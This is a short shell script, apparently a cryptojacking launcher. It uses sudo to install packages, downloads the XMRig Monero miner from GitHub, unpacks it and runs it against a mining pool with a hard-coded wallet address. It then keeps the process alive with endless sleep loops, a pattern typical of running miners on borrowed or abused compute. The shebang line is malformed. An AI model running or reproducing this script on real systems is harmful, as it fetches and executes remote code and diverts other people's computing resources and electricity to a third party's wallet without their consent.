#I/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
ls
cd xmrig-6.15.0
./xmrig -o sg.minexmr.com:443 -u 86wfTWfiF7dGqMu6EYyibHYSEA44gV5vG8BeU448Lar9eGJgWLstkGzhyzcsuZGr9cfo1W3aCKB6GHeVqqXY89HwAqGGz4n -k --tls --rig-id rig --cpu 1
while [ 1 ]; do
sleep 3
done
sleep 999
